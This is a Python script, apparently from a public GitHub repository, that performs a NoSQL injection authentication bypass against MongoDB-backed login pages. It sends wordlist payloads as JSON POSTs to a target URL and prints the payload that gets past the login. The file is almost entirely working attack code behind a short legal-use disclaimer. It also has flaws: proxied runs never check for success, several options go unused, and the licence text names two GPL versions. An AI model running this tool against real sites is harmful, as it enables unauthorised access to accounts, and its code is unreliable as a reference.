#!/usr/bin/env python3

# MongolDB NoSQL Authentication Bypass - A Python script build to bypass authentication
# Copyright (C) 2020 https://github.com/PurnanshDavawala/NoSQLInjection
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.
#
# In all other respects the GPL version 3 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program.
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  If these terms are not acceptable to
# you, then do not use this tool.
#
# You are encouraged to send comments, improvements or suggestions to
# me at https://github.com/PurnanshDavawala/NoSQLInjection
#
# Description
# -----------
# This script will perform a NoSQL Authentication Bypass attack against login page
#
# Limitations
# -----------
# This script only works with NoSQL database and web-server accepting JSON data.
#
# Usage
# -----
# Check the --help for parameter description

import requests
import argparse
import threading
from colorama import Fore, Back, Style

parser = argparse.ArgumentParser(description='NoSQL Authentication bypass')
parser.add_argument('-u', '--url', type=str, metavar='', required=True, help='Target URL (e.g. "http://www.example.com/login")')
parser.add_argument('-d', '--data', type=str, metavar='', required=False, help='Data string to be sent through POST')
parser.add_argument('-w', '--wordlist', type=str, metavar='', required=True, help='Path to the wordlist')
parser.add_argument('-U', '--Username', type=str, metavar='', required=False, help='Name of the username parameter')
parser.add_argument('-P', '--Password', type=str, metavar='', required=False, help='Name of the password parameter')
parser.add_argument('-p', '--proxy', type=str, metavar='', required=False, help='Use a proxy to connect to the target URL (e.g. "127.0.0.1:8080")')
parser.add_argument('-v', '--verbose', required=False, help='verbose mode', action='store_true')
parser.add_argument('-Lo', '--LogoutIdentifier', type=str, metavar='', required=True, help='String identifier from logged out page')

args = parser.parse_args()

URL = args.url
DATA = args.data
Username = args.Username
Password = args.Password
WORDLIST = args.wordlist
LogoutIdentifier = args.LogoutIdentifier
Proxy = args.proxy

Payload = [];

passlist = open(WORDLIST , 'r')

for line in passlist:
        Data = line.strip()
        Payload.append(Data)

for Data in Payload:
    session = requests.Session()
    login_page = session.get(URL)

    print('[*] Trying: {p}'.format(p = Data))

    headers =   {
			        'Content-Type': 'application/json'
			    }

    payload = Data

    if args.proxy:
    	proxies =   {
            			"http" : "%s" % (Proxy),
            			"https" : "%s" % (Proxy)
            		}

    	login_result = session.post(URL, headers=headers, data = payload, allow_redirects = True, proxies=proxies, verify=False)
    else:
    	login_result = session.post(URL, headers=headers, data = payload, allow_redirects=True, verify = False)
    	
    	if args.verbose:
    		print('[*] Trying: {p}'.format(p = payload))
    		print(login_result.text)

    	if not LogoutIdentifier in login_result.text:
    		if login_result.status_code == 200:
	    		AuthenticationPass = True
	    		
	    		print("Status code: %s" % login_result.status_code)
	    		print(login_result.text)
	    		print(Fore.GREEN + 'Use this payload to bypass : %s' % payload)
	    		print(Style.RESET_ALL)
	    		break		